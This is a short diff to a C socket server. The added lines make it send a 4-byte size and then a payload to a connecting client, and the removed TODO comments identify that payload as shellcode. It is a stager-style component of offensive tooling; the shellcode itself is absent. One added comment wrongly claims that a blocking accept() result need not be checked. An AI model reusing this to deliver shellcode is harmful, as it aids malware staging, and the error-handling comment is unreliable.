@@ -93,16 +93,20 @@ int main(int argc, char **argv) {
     serv_addr.sin_addr.s_addr = INADDR_ANY;
 
     //Bind socket to address
+    if(bind(sockfd,(struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0){
+        perror("Could not bind socket to address.");
+    }
+    //set socket to listen for incoming connections
     listen(sockfd, 5);
 
     len_cli = sizeof(cli_addr);
+    //The accept() call here is blocking, and thus the result need not be verified
     acceptfd = accept(sockfd, (struct sockaddr *) &cli_addr, (socklen_t *) &len_cli);
-
+    printf("Connected to client");
     bzero(buf, 256);
 
-    //TODO add code here to send shellcode size of fixed length of 4 bytes
-    //TODO add code to transmit shellcode to connected client.
-
-
+    //Transmit size of payload, then send
+    write(acceptfd,&payld_sz,4);
+    write(acceptfd,payld,payld_sz);
     return 0;
 }
